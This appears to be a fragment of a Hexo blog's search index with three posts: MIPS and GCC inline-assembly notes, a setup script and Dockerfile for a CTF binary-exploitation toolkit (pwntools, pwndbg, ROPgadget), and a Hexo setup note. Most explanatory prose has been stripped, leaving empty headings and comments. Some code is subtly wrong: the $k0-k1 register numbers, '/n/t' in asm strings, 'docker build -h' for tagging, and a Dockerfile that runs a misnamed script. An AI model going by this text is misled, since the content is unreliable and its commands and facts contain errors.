`#`</span><br><span class="line"></span><br><span class="line">rd: register destination</span><br><span class="line">rt: target</span><br><span class="line">rs: source</span><br></pre></td></tr></table></figure><p> 32</p><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">0</span>-$<span class="number">31</span>          <span class="comment"># </span></span><br><span class="line"><span class="symbol">$0:</span>    $<span class="built_in">zero</span>    <span class="comment"># 0</span></span><br><span class="line"><span class="number">1</span>:     $<span class="built_in">at</span>      # </span><br><span class="line"><span class="number">2</span><span class="number">-3</span>:   $<span class="built_in">v0</span>-<span class="built_in">v1</span>   <span class="comment"># value </span></span><br><span class="line"><span class="number">4</span><span class="number">-7</span>:   $<span class="built_in">a0</span>-<span class="built_in">a3</span>   <span class="comment"># arg  </span></span><br><span class="line"><span class="number">8</span><span class="number">-15</span>:  $<span class="built_in">t0</span>-<span class="built_in">t7</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-23</span>: $<span class="built_in">s0</span>-<span class="built_in">s7</span>   <span class="comment"># save </span></span><br><span class="line"><span class="number">24</span><span class="number">-25</span>: $<span class="built_in">t8</span>-<span class="built_in">t9</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-27</span>: $<span class="built_in">k0</span>-<span class="built_in">k1</span>   <span class="comment"># </span></span><br><span class="line"><span class="number">28</span>:    $<span class="built_in">gp</span>      <span class="comment"># global pointer</span></span><br><span class="line"><span class="number">29</span>:    $<span class="built_in">sp</span>      <span class="comment"># stack pointer</span></span><br><span class="line"><span class="number">30</span>:    $<span class="built_in">fp</span>, <span class="built_in">s8</span>  <span class="comment"># frame pointer </span></span><br><span class="line"><span class="number">31</span>:    $<span class="built_in">ra</span>      <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; </span></span><br><span class="line"><span class="symbol">pc:</span> program cunter</span><br></pre></td></tr></table></figure><p></p><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r: register format <span class="comment"># </span></span><br><span class="line">i: immediate       <span class="comment"># </span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jump</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">a0</span>, $<span class="built_in">zero</span>    <span class="comment"># a0&lt;-0</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  load, store</span></span><br><span class="line"><span class="comment"># b: byte; w: word; h: half word; ...</span></span><br><span class="line"><span class="keyword">sw: </span><span class="keyword">sw </span>$<span class="built_in">ra</span>, <span class="number">0x38</span>($<span class="built_in">sp</span>)   <span class="comment"># $ra $sp+38</span></span><br><span class="line"><span class="keyword">sb: </span>...</span><br><span class="line"><span class="keyword">lw: </span>...</span><br><span class="line"><span class="keyword">lb: </span>...</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">sb </span>r1, <span class="number">0</span>(R2)</span><br><span class="line"><span class="keyword">lb </span>r1, <span class="number">0</span>(r2)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; </span></span><br><span class="line"><span class="keyword">add</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sub</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; </span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">xor</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">nor</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; </span></span><br><span class="line"><span class="keyword">sll</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">srl</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; jmp</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jmp </span>label</span><br><span class="line"><span class="keyword">jr: </span> <span class="keyword">jr </span>$<span class="built_in">ra</span> </span><br><span class="line"><span class="keyword">jal: </span><span class="keyword">jmp </span><span class="keyword">and </span>link,  ret <span class="keyword">addr(pc+4) </span> $<span class="built_in">ra</span></span><br><span class="line"><span class="keyword">jalr: </span></span><br><span class="line"></span><br><span class="line"><span class="comment">; branch, </span></span><br><span class="line"><span class="keyword">beq: </span><span class="keyword">beq </span>$s, $t, offset   <span class="comment"># $s=$t</span></span><br><span class="line"><span class="keyword">bne: </span><span class="keyword">b </span>not eq</span><br><span class="line"><span class="keyword">bltz: </span><span class="keyword">branch </span>less than <span class="built_in">zero</span></span><br></pre></td></tr></table></figure><p></p><ul><li>cache:   </li></ul><h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p>xxx</p><h2 id="GCC-Inline-Assembly"><a href="#GCC-Inline-Assembly" class="headerlink" title="GCC Inline Assembly"></a>GCC Inline Assembly</h2><p> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">asm</span>(<span class="string">&quot;mov $1, %eax&quot;</span>)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">asm</span> ( assembler <span class="keyword">template</span>  </span><br><span class="line">: output operands                   <span class="comment">/* optional  */</span>  </span><br><span class="line">: input operands                    <span class="comment">/* optional */</span>  </span><br><span class="line">: list of clobbered registers       <span class="comment">/* optional */</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p></p><ul><li>r: register</li><li>m:memory</li><li></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a rax/eax/ax/al</span><br><span class="line">b rbx</span><br><span class="line">c rcx</span><br><span class="line">d rdx</span><br><span class="line">S rsi</span><br><span class="line">D rdi</span><br><span class="line">I </span><br><span class="line">q,r </span><br><span class="line">g eax,ebx,ecx,edx</span><br><span class="line">A eaxedx64(use long longs)</span><br></pre></td></tr></table></figure><ol><li> q  eax, ebx, ecx, edx   r  eax, ebx, ecx, edx, esi, edi </li><li></li><li><code>&quot;=&quot;</code> <strong></strong></li><li> <code>%n</code> rqrq</li></ol><p> 1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">asm</span> (</span><br><span class="line"><span class="string">&quot;cld/n/t&quot;</span>  </span><br><span class="line"><span class="string">&quot;rep/n/t&quot;</span>  </span><br><span class="line"><span class="string">&quot;stosl&quot;</span>  </span><br><span class="line">: <span class="comment">/* no output registers */</span>  </span><br><span class="line">: <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)  </span><br><span class="line">: <span class="string">&quot;%edi&quot;</span> </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// intel count </span></span><br><span class="line">push edi</span><br><span class="line">mov ecx, count</span><br><span class="line">mov eax, fill_value</span><br><span class="line">mov edi, dest</span><br><span class="line">cld</span><br><span class="line">rep</span><br><span class="line">stosl</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__asm__ (</span><br><span class="line"><span class="string">&quot;push %%rax&quot;</span></span><br><span class="line"><span class="string">&quot;pop %0&quot;</span></span><br><span class="line">: <span class="string">&quot;=m&quot;</span>(var)</span><br><span class="line">: <span class="string">&quot;c&quot;</span>(count)</span><br><span class="line">: memory</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://learningos.cn/ucore_os_webdocs/lab0/lab0_2_3_1_3_gcc_inline_asm.html">GCC   GitBook (learningos.cn)</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-INIT</title>
      <link href="/2023/06/05/PWN-ENV-INIT/"/>
      <url>/2023/06/05/PWN-ENV-INIT/</url>
      
        <content type="html"><![CDATA[<blockquote><p>pwn</p></blockquote><span id="more"></span><ul><li><code>apt</code> or <code>apt-get</code>? aptwarning,<ul><li> <code>apt-get</code></li><li><code>-y</code> yes </li></ul></li></ul><h3 id="VM-or-WSL"><a href="#VM-or-WSL" class="headerlink" title="VM or WSL"></a>VM or WSL</h3><blockquote><p></p></blockquote><p>root<code>gdb</code>gdbinit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install -y patchelf</span><br><span class="line">apt-get install -y wget</span><br><span class="line">apt-get install -y zip</span><br><span class="line">apt-get install -y tzdata</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwngdb</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuapt-getx/Pwngdb.git </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># gem</span></span><br><span class="line">gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccomp-tools</span></span><br><span class="line">gem install seccomp-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget</span></span><br><span class="line">gem install one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwninit</span></span><br><span class="line">apt-get install liblzma-dev pkgconf</span><br><span class="line">apt-get install cargo</span><br><span class="line">cargo install pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker </span></span><br><span class="line"><span class="comment"># apt-get install docker.io</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu </span></span><br><span class="line"><span class="comment"># apt-get install qemu qemu-system qemu-user-static binfmt-support</span></span><br></pre></td></tr></table></figure><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p></p><p>LibcDockerfile</p><ul><li>glibc-all-in-one libc patch(<code>patchelf</code>).</li><li>docker</li></ul><p>docker: VERSION</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ARG</span> VERSION=<span class="number">20.04</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:$VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND noninteractive </span><br><span class="line"><span class="comment"># ENV TZ=Asia/Shanghai</span></span><br><span class="line"><span class="comment">########## solve some error ##############</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwninit.sh /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/pwninit.sh &amp;&amp; /root/pwninit</span></span><br></pre></td></tr></table></figure><p>pwninit: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># others</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -h &lt;repo&gt;:&lt;tag&gt; .</span><br><span class="line"><span class="comment"># -f dockerfile</span></span><br><span class="line"><span class="comment"># repo  xxx/xxx</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu:VERSION /bin/bash</span><br><span class="line"><span class="comment"># -v dir:dir </span></span><br></pre></td></tr></table></figure><p>docker </p><ul><li>-i: </li><li>-t: terminl</li><li>-v hostDir:dockerDir </li><li>ps -a: </li></ul><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker start &lt;ID&gt;</span><br><span class="line">docker attach &lt;ID&gt;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;ID&gt;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;ID&gt;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;ID&gt;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>error 1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">******</span><br><span class="line">Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.</span><br><span class="line">You might try launching gdb with:</span><br><span class="line">    LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb</span><br><span class="line">Make sure that en_US.UTF-8 is activated <span class="keyword">in</span> /etc/locale.gen and you called locale-gen</span><br><span class="line">******</span><br></pre></td></tr></table></figure><p>error 2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/gdbinit.py&quot;</span>, line 58, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pwndbg  <span class="comment"># noqa: F401</span></span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/__init__.py&quot;</span>, line 86, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    config_mod.init_params()</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 159, <span class="keyword">in</span> init_params</span><br><span class="line">    Parameter(p)</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 45, <span class="keyword">in</span> __init__</span><br><span class="line">    self.value = param.value</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br><span class="line"><span class="string">------- tip of the day (disable with set show-tips off) -------</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/pwndbg/pwndbg/issues/1539">issue</a></p><ul><li>error1dockerfile</li><li>error2  </li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ENV LANG en_US.utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><p>docker</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>init-blog</title>
      <link href="/2023/03/19/init-blog/"/>
      <url>/2023/03/19/init-blog/</url>
      
        <content type="html"><![CDATA[<blockquote><p>blog init</p></blockquote><span id="more"></span><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>github + hexo</p><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><p><code>hexo</code>  <code>npx hexo</code></p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">npx hexo init <span class="comment"># </span></span><br><span class="line">npx hexo clean</span><br><span class="line">npx hexo g   <span class="comment"># </span></span><br><span class="line">npx hexo s   <span class="comment">#  service</span></span><br><span class="line">npx hexo d   <span class="comment"># github</span></span><br><span class="line"></span><br><span class="line">npx hexo new page &lt;name&gt; <span class="comment"># </span></span><br><span class="line">npx hexo new &lt;name&gt;.md   <span class="comment">#</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title:   &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="built_in">date</span>: ,  &#123;&#123;<span class="built_in">date</span>&#125;&#125;</span><br><span class="line">updated: </span><br><span class="line">tags: </span><br><span class="line">categories: </span><br><span class="line">comments:  <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ul><li>obsidian md</li><li>vscode</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li></li><li> + google</li></ul><p><a href="https://hexo.io/zh-cn/docs/"></a></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
